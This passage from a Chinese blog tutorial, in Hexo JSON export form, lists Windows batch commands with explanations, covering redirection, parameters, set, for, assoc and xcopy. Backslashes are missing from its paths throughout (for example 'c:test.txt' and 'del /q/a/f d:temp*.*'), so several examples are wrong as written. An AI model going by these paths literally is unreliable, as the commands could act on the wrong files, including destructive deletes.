|\n管道命令\ndir *.* /s/a | find /c \".exe\"\n管道命令表示先执行 dir 命令，对其输出的结果执行后面的 find 命令\n该命令行结果：输出当前文件夹及所有子文件夹里的.exe文件的个数\ntype c:test.txt|more\n这个和 more c:test.txt 的效果是一样的\n\n26 > 和 >>\n输出重定向命令\n> 清除文件中原有的内容后再写入\n>> 追加内容到文件末尾，而不会清除原有的内容\n主要将本来显示在屏幕上的内容输出到指定文件中\n指定文件如果不存在，则自动生成该文件\ntype c:test.txt >prn\n屏幕上不显示文件内容，转向输出到打印机\necho hello world>con\n在屏幕上显示hello world，实际上所有输出都是默认 >con 的\ncopy c:test.txt f: >nul\n拷贝文件，并且不显示\"文件复制成功\"的提示信息，但如果f盘不存在，还是会显示出错信息\ncopy c:test.txt f: >nul 2>nul\n不显示”文件复制成功”的提示信息，并且f盘不存在的话，也不显示错误提示信息\necho ^^W ^> ^W>c:test.txt\n生成的文件内容为 ^W > W\n^ 和 > 是控制命令，要把它们输出到文件，必须在前面加个 ^ 符号\n\n27 <\n从文件中获得输入信息，而不是从屏幕上\n一般用于 date time label 等需要等待输入的命令\n@echo off\necho 2005-05-01>temp.txt\ndate <temp.txt\ndel temp.txt\n这样就可以不等待输入直接修改当前日期\n\n28 %0 %1 %2 %3 %4 %5 %6 %7 %8 %9 %*\n命令行传递给批处理的参数  //上一个命令的结果作为参数\n%0 批处理文件本身\n%1 第一个参数\n%9 第九个参数\n%* 从第一个参数开始的所有参数\n批参数(%n)的替代已被增强。您可以使用以下语法:\n%~1 - 删除引号(\" )， 扩充 %1\n%~f1 - 将 %1 扩充到一个完全合格的路径名\n%~d1 - 仅将 %1 扩充到一个驱动器号\n%~p1 - 仅将 %1 扩充到一个路径\n%~n1 - 仅将 %1 扩充到一个文件名\n%~x1 - 仅将 %1 扩充到一个文件扩展名\n%~s1 - 扩充的路径指含有短名\n%~a1 - 将 %1 扩充到文件属性\n%~t1 - 将 %1 扩充到文件的日期/时间\n%~z1 - 将 %1 扩充到文件的大小\n%~$PATH : 1 - 查找列在 PATH 环境变量的目录，并将 %1\n扩充到找到的第一个完全合格的名称。如果环境\n变量名未被定义，或者没有找到文件，此组合键会\n扩充到空字符串\n可以组合修定符来取得多重结果:\n%~dp1 - 只将 %1 扩展到驱动器号和路径\n%~nx1 - 只将 %1 扩展到文件名和扩展名\n%~dp$PATH:1 - 在列在 PATH 环境变量中的目录里查找 %1，\n并扩展到找到的第一个文件的驱动器号和路径。\n%~ftza1 - 将 %1 扩展到类似 DIR 的输出行。\n可以参照 call/? 或 for/? 看出每个参数的含意\necho load \"%%1\" \"%%2\">c:test.txt\n生成的文件内容为 load \"%1\"  \"%2\"\n批处理文件里，用这个格式把命令行参数输出到文件\n\n29 if\n判断命令\nif \"%1\"==\"/a\" echo 第一个参数是/a\nif /i \"%1\" equ \"/a\" echo 第一个参数是/a\n/i 表示不区分大小写，equ 和 == 是一样的，其它运算符参见 if/?\nif exist c:test.bat echo 存在c:test.bat文件\nif not exist c:windows (\necho 不存在c:windows文件夹\n)\nif exist c:test.bat (\necho 存在c:test.bat\n) else (\necho 不存在c:test.bat\n)\n30 setlocal 和 endlocal\n设置”命令扩展名”和”延缓环境变量扩充”\nSETLOCAL ENABLEEXTENSIONS #启用\"命令扩展名\"\nSETLOCAL DISABLEEXTENSIONS #停用\"命令扩展名\"\nSETLOCAL ENABLEDELAYEDEXPANSION #启用\"延缓环境变量扩充\"\nSETLOCAL DISABLEDELAYEDEXPANSION #停用\"延缓环境变量扩充\"\nENDLOCAL #恢复到使用SETLOCAL语句以前的状态\n“命令扩展名”默认为启用\n“延缓环境变量扩充”默认为停用\n批处理结束系统会自动恢复默认值\n可以修改注册表以禁用\"命令扩展名\"，详见 cmd /? 。所以用到\"命令扩展名\"的程\n序，建议在开头和结尾加上 SETLOCAL ENABLEEXTENSIONS 和 ENDLOCAL 语句，以确\n保程序能在其它系统上正确运行\n\"延缓环境变量扩充\"主要用于 if 和 for 的符合语句，在 set 的说明里有其实用例程\n```\n\n### 命令31~39\n\n```\n31 set\n设置变量\n引用变量可在变量名前后加 % ，即 %变量名%\nset #显示目前所有可用的变量，包括系统变量和自定义的变量\necho %SystemDrive% #显示系统盘盘符。系统变量可以直接引用\nset p #显示所有以p开头的变量，要是一个也没有就设errorlevel=1\nset p=aa1bb1aa2bb2 #设置变量p，并赋值为 = 后面的字符串，即aa1bb1aa2bb2\necho %p% #显示变量p代表的字符串，即aa1bb1aa2bb2\necho %p:~6% #显示变量p中第6个字符以后的所有字符，即aa2bb2\necho %p:~6,3% #显示第6个字符以后的3个字符，即aa2\necho %p:~0,3% #显示前3个字符，即aa1\necho %p:~-2% #显示最后面的2个字符，即b2\necho %p:~0,-2% #显示除了最后2个字符以外的其它字符，即aa1bb1aa2b\necho %p:aa=c% #用c替换变量p中所有的aa，即显示c1bb1c2bb2\necho %p:aa=% #将变量p中的所有aa字符串置换为空，即显示1bb12bb2\necho %p:*bb=c% #第一个bb及其之前的所有字符被替换为c，即显示c1aa2bb2\nset p=%p:*bb=c% #设置变量p，赋值为 %p:*bb=c% ，即c1aa2bb2\nset /a p=39 #设置p为数值型变量，值为39\nset /a p=39/10 #支持运算符，有小数时用去尾法，39/10=3.9，去尾得3，p=3\nset /a p=p/10 #用 /a 参数时，在 = 后面的变量可以不加%直接引用\nset /a p=”1&0″ #”与”运算，要加引号。其它支持的运算符参见set/?\nset p= #取消p变量\nset /p p=请输入\n屏幕上显示”请输入”，并会将输入的字符串赋值给变量p\n注意这条可以用来取代 choice 命令\n注意变量在 if 和 for 的复合语句里是一次性全部替换的，如\n@echo off\nset p=aaa\nif %p%==aaa (\necho %p%\nset p=bbb\necho %p%\n)\n结果将显示\naaa\naaa\n因为在读取 if 语句时已经将所有 %p% 替换为aaa\n这里的\"替换\"，在 /? 帮助里就是指\"扩充\"、\"环境变量扩充\"\n可以启用”延缓环境变量扩充”，用 ! 来引用变量，即 !变量名!\n@echo off\nSETLOCAL ENABLEDELAYEDEXPANSION\nset p=aaa\nif %p%==aaa (\necho %p%\nset p=bbb\necho !p!\n)\nENDLOCAL\n结果将显示\naaa\nbbb\n还有几个动态变量，运行 set 看不到\n%CD% #代表当前目录的字符串\n%DATE% #当前日期\n%TIME% #当前时间\n%RANDOM% #随机整数，介于0~32767\n%ERRORLEVEL% #当前 ERRORLEVEL 值\n%CMDEXTVERSION% #当前命令处理器扩展名版本号\n%CMDCMDLINE% #调用命令处理器的原始命令行\n可以用echo命令查看每个变量值，如 echo %time%\n注意 %time% 精确到毫秒，在批处理需要延时处理时可以用到\n\n32 start\n批处理中调用外部程序的命令，否则等外部程序完成后才继续执行剩下的指令\n\n33 call\n批处理中调用另外一个批处理的命令，否则剩下的批处理指令将不会被执行\n有时有的应用程序用start调用出错的，也可以call调用\n\n34 choice (外部命令)\n选择命令\n让用户输入一个字符，从而选择运行不同的命令，返回码errorlevel为1234……\nwin98里是choice.com\nwin2000pro里没有，可以从win98里拷过来\nwin2003里是choice.exe\nchoice /N /C y /T 5 /D y>nul\n延时5秒\n\n35 assoc 和 ftype\n文件关联\nassoc 设置'文件扩展名'关联，关联到'文件类型'\nftype 设置'文件类型'关联，关联到'执行程序和参数'\n当你双击一个.txt文件时，windows并不是根据.txt直接判断用 notepad.exe 打开\n而是先判断.txt属于 txtfile '文件类型'\n再调用 txtfile 关联的命令行 txtfile=%SystemRoot%system32NOTEPAD.EXE %1\n可以在\"文件夹选项\"→\"文件类型\"里修改这2种关联\nassoc #显示所有'文件扩展名'关联\nassoc .txt #显示.txt代表的'文件类型'，结果显示 .txt=txtfile\nassoc .doc #显示.doc代表的'文件类型'，结果显示 .doc=Word.Document.8\nassoc .exe #显示.exe代表的'文件类型'，结果显示 .exe=exefile\nftype #显示所有'文件类型'关联\nftype exefile #显示exefile类型关联的命令行，结果显示 exefile=\"%1\" %*\nassoc .txt=Word.Document.8\n设置.txt为word类型的文档，可以看到.txt文件的图标都变了\nassoc .txt=txtfile\n恢复.txt的正确关联\nftype exefile=\"%1\" %*\n恢复 exefile 的正确关联\n如果该关联已经被破坏，可以运行 command.com ，再输入这条命令\n\n36 pushd 和 popd\n切换当前目录\n@echo off\nc: & cd & md mp3 #在 C: 建立 mp3 文件夹\nmd d:mp4 #在 D: 建立 mp4 文件夹\ncd /d d:mp4 #更改当前目录为 d:mp4\npushd c:mp3 #保存当前目录，并切换当前目录为 c:mp3\npopd #恢复当前目录为刚才保存的 d:mp4\n\n37 for\n循环命令\n这个比较复杂，请对照 for/? 来看\nfor %%i in (c: d: e: f:) do echo %%i\n依次调用小括号里的每个字符串，执行 do 后面的命令\n注意%%i，在批处理中 for 语句调用参数用2个%\n默认的字符串分隔符是\"空格键\"，\"Tab键\"，\"回车键\"\nfor %%i in (*.txt) do find \"abc\" %%i\n对当前目录里所有的txt文件执行 find 命令\nfor /r . %%i in (*.txt) do find \"abc\" %%i\n在当前目录和子目录里所有的.txt文件中搜索包含 abc 字符串的行\nfor /r . %%i in (.) do echo %%~pni\n显示当前目录名和所有子目录名，包括路径，不包括盘符\nfor /r d:mp3 %%i in (*.mp3) do echo %%i>>d:mp3.txt\n把 d:mp3 及其子目录里的mp3文件的文件名都存到 d:mp3.txt 里去\nfor /l %%i in (2,1,8) do echo %%i\n生成2345678的一串数字，2是数字序列的开头，8是结尾，1表示每次加1\nfor /f %%i in ('set') do echo %%i\n对 set 命令的输出结果循环调用，每行一个\nfor /f \"eol=P\" %%i in ('set') do echo %%i\n取 set 命令的输出结果，忽略以 P 开头的那几行\nfor /f %%i in (d:mp3.txt) do echo %%i\n显示 d:mp3.txt 里的每个文件名，每行一个，不支持带空格的名称\nfor /f \"delims=\" %%i in (d:mp3.txt) do echo %%i\n显示 d:mp3.txt 里的每个文件名，每行一个，支持带空格的名称\nfor /f \"skip=5 tokens=4\" %%a in ('dir') do echo %%a\n对 dir 命令的结果，跳过前面5行，余下的每行取第4列\n每列之间的分隔符为默认的\"空格\"\n可以注意到 dir 命令输出的前5行是没有文件名的\nfor /f \"tokens=1,2,3 delims=- \" %%a in ('date /t') do (\necho %%a\necho %%b\necho %%c\n)\n对 date /t 的输出结果，每行取1、2、3列\n第一列对应指定的 %%a ，后面的 %%b 和 %%c 是派生出来的，对应其它列\n分隔符指定为 - 和\"空格\"，注意 delims=- 后面有个\"空格\"\n其中 tokens=1,2,3 若用 tokens=1-3 替换，效果是一样的\nfor /f \"tokens=2* delims=- \" %%a in ('date /t') do echo %%b\n取第2列给 %%a ，其后的列都给 %%b\n\n38 subst (外部命令)\n映射磁盘。\nsubst z: serverd #这样输入z:就可以访问serverd了\nsubst z: /d #取消该映射\nsubst #显示目前所有的映时\n\n39 xcopy (外部命令)\n文件拷贝\nxcopy d:mp3 e:mp3 /s/e/i/y\n复制 d:mp3 文件夹、所有子文件夹和文件到 e: ，覆盖已有文件\n加 /i 表示如果 e: 没有 mp3 文件夹就自动新建一个，否则会有询问\n```\n\n","slug":"bat批处理文件","published":1,"updated":"2021-06-20T02:32:43.669Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckq4nzazr002v7vvt8qm31pk0","content":"<h1 id=\"bat批处理命令及解释\"><a href=\"#bat批处理命令及解释\" class=\"headerlink\" title=\"bat批处理命令及解释\"></a>bat批处理命令及解释</h1><p><a href=\"https://www.cnblogs.com/xpwi/p/9626959.html\">相关原文链接</a></p>\n<h2 id=\"一、批处理概念\"><a href=\"#一、批处理概念\" class=\"headerlink\" title=\"一、批处理概念\"></a>一、批处理概念</h2><ul>\n<li>批处理文件：包含DOS命令的可编辑可执行文件</li>\n<li>批处理：可以对某一对象批量操作的文件</li>\n</ul>\n<span id=\"more\"></span>\n\n<h2 id=\"二、批处理命令简介\"><a href=\"#二、批处理命令简介\" class=\"headerlink\" title=\"二、批处理命令简介\"></a>二、批处理命令简介</h2><h3 id=\"命令1-10\"><a href=\"#命令1-10\" class=\"headerlink\" title=\"命令1~10\"></a>命令1~10</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 echo 和 @</span><br><span class=\"line\">回显命令</span><br><span class=\"line\">@  #关闭单行回显</span><br><span class=\"line\">echo off  #从下一行开始关闭回显</span><br><span class=\"line\">@echo off  #从本行开始关闭回显。一般批处理第一行都是这个</span><br><span class=\"line\">echo on #从下一行开始打开回显</span><br><span class=\"line\">echo #显示当前是 echo off 状态还是 echo on 状态</span><br><span class=\"line\">echo. #输出一个”回车换行”，空白行</span><br><span class=\"line\">#(同echo, echo; echo+ echo[ echo] echo/ echo)</span><br><span class=\"line\"></span><br><span class=\"line\">2 errorlevel</span><br><span class=\"line\">echo %errorlevel%</span><br><span class=\"line\">每个命令运行结束，可以用这个命令行格式查看返回码</span><br><span class=\"line\">默认值为0，一般命令执行出错会设 errorlevel 为1</span><br><span class=\"line\"></span><br><span class=\"line\">3 dir</span><br><span class=\"line\">显示文件夹内容</span><br><span class=\"line\">dir #显示当前目录中的文件和子目录</span><br><span class=\"line\">dir /a #显示当前目录中的文件和子目录，包括隐藏文件和系统文件</span><br><span class=\"line\">dir c: /a:d #显示 C 盘当前目录中的目录</span><br><span class=\"line\">dir c: /a:-d #显示 C 盘根目录中的文件</span><br><span class=\"line\">dir c: /b/p #/b只显示文件名，/p分页显示</span><br><span class=\"line\">dir *.exe /s #显示当前目录和子目录里所有的.exe文件</span><br><span class=\"line\"></span><br><span class=\"line\">4 cd</span><br><span class=\"line\">切换目录</span><br><span class=\"line\">cd #进入根目录</span><br><span class=\"line\">cd #显示当前目录</span><br><span class=\"line\">cd /d d:sdk #可以同时更改盘符和目录</span><br><span class=\"line\"></span><br><span class=\"line\">5 md</span><br><span class=\"line\">创建目录</span><br><span class=\"line\">md d:abc #如果 d:a 不存在，将会自动创建中级目录</span><br><span class=\"line\">#如果命令扩展名被停用，则需要键入 mkdir abc</span><br><span class=\"line\"></span><br><span class=\"line\">6 rd</span><br><span class=\"line\">删除目录</span><br><span class=\"line\">rd abc #删除当前目录里的 abc 子目录，要求为空目录</span><br><span class=\"line\">rd /s/q d:temp #删除 d:temp 文件夹及其子文件夹和文件，/q安静模式</span><br><span class=\"line\"></span><br><span class=\"line\">7 del</span><br><span class=\"line\">删除文件</span><br><span class=\"line\">del d:test.txt #删除指定文件，不能是隐藏、系统、只读文件</span><br><span class=\"line\">del /q/a/f d:temp*.*</span><br><span class=\"line\">删除 d:temp 文件夹里面的所有文件，包括隐藏、只读、系统文件，不包括子目录</span><br><span class=\"line\">del /q/a/f/s d:temp*.*</span><br><span class=\"line\">删除 d:temp 及子文件夹里面的所有文件，包括隐藏、只读、系统文件，不包括子目录</span><br><span class=\"line\"></span><br><span class=\"line\">8 ren</span><br><span class=\"line\">重命名命令</span><br><span class=\"line\">ren d:temp tmp #支持对文件夹的重命名</span><br><span class=\"line\"></span><br><span class=\"line\">9 cls</span><br><span class=\"line\">清屏</span><br><span class=\"line\">10 type</span><br><span class=\"line\">显示文件内容</span><br><span class=\"line\">type c:boot.ini #显示指定文件的内容，程序文件一般会显示乱码</span><br><span class=\"line\">type *.txt #显示当前目录里所有.txt文件的内容</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"命令11-20\"><a href=\"#命令11-20\" class=\"headerlink\" title=\"命令11~20\"></a>命令11~20</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">11 copy</span><br><span class=\"line\">拷贝文件</span><br><span class=\"line\">copy c:test.txt d:test.bak</span><br><span class=\"line\">复制 c:test.txt 文件到 d: ，并重命名为 test.bak</span><br><span class=\"line\">copy con test.txt</span><br><span class=\"line\">从屏幕上等待输入，按 Ctrl+Z 结束输入，输入内容存为test.txt文件</span><br><span class=\"line\">con代表屏幕，prn代表打印机，nul代表空设备</span><br><span class=\"line\">copy 1.txt + 2.txt 3.txt</span><br><span class=\"line\">合并 1.txt 和 2.txt 的内容，保存为 3.txt 文件</span><br><span class=\"line\">如果不指定 3.txt ，则保存到 1.txt</span><br><span class=\"line\">copy test.txt +</span><br><span class=\"line\">复制文件到自己，实际上是修改了文件日期</span><br><span class=\"line\"></span><br><span class=\"line\">12 title</span><br><span class=\"line\">设置cmd窗口的标题</span><br><span class=\"line\">title 新标题 #可以看到cmd窗口的标题栏变了</span><br><span class=\"line\"></span><br><span class=\"line\">13 ver</span><br><span class=\"line\">显示系统版本</span><br><span class=\"line\"></span><br><span class=\"line\">14 label 和 vol</span><br><span class=\"line\">设置卷标</span><br><span class=\"line\">vol #显示卷标</span><br><span class=\"line\">label #显示卷标，同时提示输入新卷标</span><br><span class=\"line\">label c:system #设置C盘的卷标为 system</span><br><span class=\"line\"></span><br><span class=\"line\">15 pause</span><br><span class=\"line\">暂停命令 //常用于使命令行窗口暂停，不至于打开bat文件后立即结束</span><br><span class=\"line\"></span><br><span class=\"line\">16 rem 和 ::</span><br><span class=\"line\">注释命令</span><br><span class=\"line\">注释行不执行操作</span><br><span class=\"line\"></span><br><span class=\"line\">17 date 和 time</span><br><span class=\"line\">日期和时间</span><br><span class=\"line\">date #显示当前日期，并提示输入新日期，按&quot;回车&quot;略过输入</span><br><span class=\"line\">date/t #只显示当前日期，不提示输入新日期</span><br><span class=\"line\">time #显示当前时间，并提示输入新时间，按&quot;回车&quot;略过输入</span><br><span class=\"line\">time/t #只显示当前时间，不提示输入新时间</span><br><span class=\"line\"></span><br><span class=\"line\">18 goto 和 :</span><br><span class=\"line\">跳转命令</span><br><span class=\"line\">:label #行首为:表示该行是标签行，标签行不执行操作</span><br><span class=\"line\">goto label #跳转到指定的标签那一行</span><br><span class=\"line\"></span><br><span class=\"line\">19 find (外部命令)</span><br><span class=\"line\">查找命令</span><br><span class=\"line\">find &quot;abc&quot; c:test.txt</span><br><span class=\"line\">在 c:test.txt 文件里查找含 abc 字符串的行</span><br><span class=\"line\">如果找不到，将设 errorlevel 返回码为1</span><br><span class=\"line\">find /i “abc” c:test.txt</span><br><span class=\"line\">查找含 abc 的行，忽略大小写</span><br><span class=\"line\">find /c &quot;abc&quot; c:test.txt</span><br><span class=\"line\">显示含 abc 的行的行数</span><br><span class=\"line\"></span><br><span class=\"line\">20 more (外部命令)</span><br><span class=\"line\">逐屏显示</span><br><span class=\"line\">more c:test.txt #逐屏显示 c:test.txt 的文件内容</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"命令21-30\"><a href=\"#命令21-30\" class=\"headerlink\" title=\"命令21~30\"></a>命令21~30</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">21 tree</span><br><span class=\"line\">显示目录结构</span><br><span class=\"line\">tree d: #显示D盘的文件目录结构</span><br><span class=\"line\"></span><br><span class=\"line\">22 &amp;</span><br><span class=\"line\">顺序执行多条命令，而不管命令是否执行成功</span><br><span class=\"line\"></span><br><span class=\"line\">23 &amp;&amp;</span><br><span class=\"line\">顺序执行多条命令，当碰到执行出错的命令后将不执行后面的命令</span><br><span class=\"line\">find &quot;ok&quot; c:test.txt &amp;&amp; echo 成功</span><br><span class=\"line\">如果找到了&quot;ok&quot;字样，就显示&quot;成功&quot;，找不到就不显示</span><br><span class=\"line\"></span><br><span class=\"line\">24 ||</span><br><span class=\"line\">顺序执行多条命令，当碰到执行正确的命令后将不执行后面的命令</span><br><span class=\"line\">find &quot;ok&quot; c:test.txt || echo 不成功</span><br><span class=\"line\">如果找不到&quot;ok&quot;字样，就显示&quot;不成功&quot;，找到了就不显示</span><br><span class=\"line\"></span><br><span class=\"line\">25 |</span><br><span class=\"line\">管道命令</span><br><span class=\"line\">dir *.* /s/a | find /c &quot;.exe&quot;</span><br><span class=\"line\">管道命令表示先执行 dir 命令，对其输出的结果执行后面的 find 命令</span><br><span class=\"line\">该命令行结果：输出当前文件夹及所有子文件夹里的.exe文件的个数</span><br><span class=\"line\">type c:test.txt|more</span><br><span class=\"line\">这个和 more c:test.txt 的效果是一样的</span><br><span class=\"line\"></span><br><span class=\"line\">26 &gt; 和 &gt;&gt;</span><br><span class=\"line\">输出重定向命令</span><br><span class=\"line\">&gt; 清除文件中原有的内容后再写入</span><br><span class=\"line\">&gt;&gt; 追加内容到文件末尾，而不会清除原有的内容</span><br><span class=\"line\">主要将本来显示在屏幕上的内容输出到指定文件中</span><br><span class=\"line\">指定文件如果不存在，则自动生成该文件</span><br><span class=\"line\">type c:test.txt &gt;prn</span><br><span class=\"line\">屏幕上不显示文件内容，转向输出到打印机</span><br><span class=\"line\">echo hello world&gt;con</span><br><span class=\"line\">在屏幕上显示hello world，实际上所有输出都是默认 &gt;con 的</span><br><span class=\"line\">copy c:test.txt f: &gt;nul</span><br><span class=\"line\">拷贝文件，并且不显示&quot;文件复制成功&quot;的提示信息，但如果f盘不存在，还是会显示出错信息</span><br><span class=\"line\">copy c:test.txt f: &gt;nul 2&gt;nul</span><br><span class=\"line\">不显示”文件复制成功”的提示信息，并且f盘不存在的话，也不显示错误提示信息</span><br><span class=\"line\">echo ^^W ^&gt; ^W&gt;c:test.txt</span><br><span class=\"line\">生成的文件内容为 ^W &gt; W</span><br><span class=\"line\">^ 和 &gt; 是控制命令，要把它们输出到文件，必须在前面加个 ^ 符号</span><br><span class=\"line\"></span><br><span class=\"line\">27 &lt;</span><br><span class=\"line\">从文件中获得输入信息，而不是从屏幕上</span><br><span class=\"line\">一般用于 date time label 等需要等待输入的命令</span><br><span class=\"line\">@echo off</span><br><span class=\"line\">echo 2005-05-01&gt;temp.txt</span><br><span class=\"line\">date &lt;temp.txt</span><br><span class=\"line\">del temp.txt</span><br><span class=\"line\">这样就可以不等待输入直接修改当前日期</span><br><span class=\"line\"></span><br><span class=\"line\">28 %0 %1 %2 %3 %4 %5 %6 %7 %8 %9 %*</span><br><span class=\"line\">命令行传递给批处理的参数  //上一个命令的结果作为参数</span><br><span class=\"line\">%0 批处理文件本身</span><br><span class=\"line\">%1 第一个参数</span><br><span class=\"line\">%9 第九个参数</span><br><span class=\"line\">%* 从第一个参数开始的所有参数</span><br><span class=\"line\">批参数(%n)的替代已被增强。您可以使用以下语法:</span><br><span class=\"line\">%~1 - 删除引号(&quot; )， 扩充 %1</span><br><span class=\"line\">%~f1 - 将 %1 扩充到一个完全合格的路径名</span><br><span class=\"line\">%~d1 - 仅将 %1 扩充到一个驱动器号</span><br><span class=\"line\">%~p1 - 仅将 %1 扩充到一个路径</span><br><span class=\"line\">%~n1 - 仅将 %1 扩充到一个文件名</span><br><span class=\"line\">%~x1 - 仅将 %1 扩充到一个文件扩展名</span><br><span class=\"line\">%~s1 - 扩充的路径指含有短名</span><br><span class=\"line\">%~a1 - 将 %1 扩充到文件属性</span><br><span class=\"line\">%~t1 - 将 %1 扩充到文件的日期/时间</span><br><span class=\"line\">%~z1 - 将 %1 扩充到文件的大小</span><br><span class=\"line\">%~$PATH : 1 - 查找列在 PATH 环境变量的目录，并将 %1</span><br><span class=\"line\">扩充到找到的第一个完全合格的名称。如果环境</span><br><span class=\"line\">变量名未被定义，或者没有找到文件，此组合键会</span><br><span class=\"line\">扩充到空字符串</span><br><span class=\"line\">可以组合修定符来取得多重结果:</span><br><span class=\"line\">%~dp1 - 只将 %1 